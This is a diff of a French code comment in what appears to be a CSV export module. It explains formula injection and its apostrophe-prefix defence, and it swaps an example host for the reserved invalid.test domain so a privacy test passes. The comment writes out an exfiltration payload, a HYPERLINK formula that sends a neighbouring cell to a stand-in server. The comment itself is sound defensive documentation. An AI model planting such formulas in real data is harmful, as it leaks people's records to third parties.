@@ -16,10 +16,17 @@
  * sécurité. Excel, LibreOffice et Google Sheets évaluent toute cellule qui
  * commence par `=`, `+`, `-`, `@`, ou par une tabulation / un retour chariot.
  * Un étudiant qui déclare son niveau comme
- * `=HYPERLINK("https://x.test?"&A1,"cliquez")` exfiltre la ligne d'à côté vers
- * un serveur tiers dès qu'un membre de l'équipe commerciale ouvre le fichier et
- * accepte l'invite. Les guillemets de la RFC 4180 n'y changent RIEN : le
- * tableur déguillemette avant d'évaluer.
+ * `=HYPERLINK("https://invalid.test?"&A1,"cliquez")` exfiltre la ligne d'à côté
+ * vers un serveur tiers dès qu'un membre de l'équipe commerciale ouvre le
+ * fichier et accepte l'invite. Les guillemets de la RFC 4180 n'y changent
+ * RIEN : le tableur déguillemette avant d'évaluer.
+ *
+ * (`invalid.test` est un domaine RÉSERVÉ par la RFC 6761, jamais résolvable, et
+ * c'est le placeholder que `privacy_disclosure_parity_test.dart` reconnaît déjà.
+ * Ce n'est pas de la coquetterie : cette garde extrait tout `https://…` de
+ * `backend/src` et exige que chaque hôte soit un processeur déclaré dans les
+ * deux politiques de confidentialité. Un hôte d'exemple inventé ici la fait
+ * échouer — mesuré, elle a échoué sur la première version de ce commentaire.)
  *
  * La neutralisation retenue est le préfixe apostrophe, qui force le tableur à
  * traiter la cellule comme du texte. On ne supprime pas le caractère : la
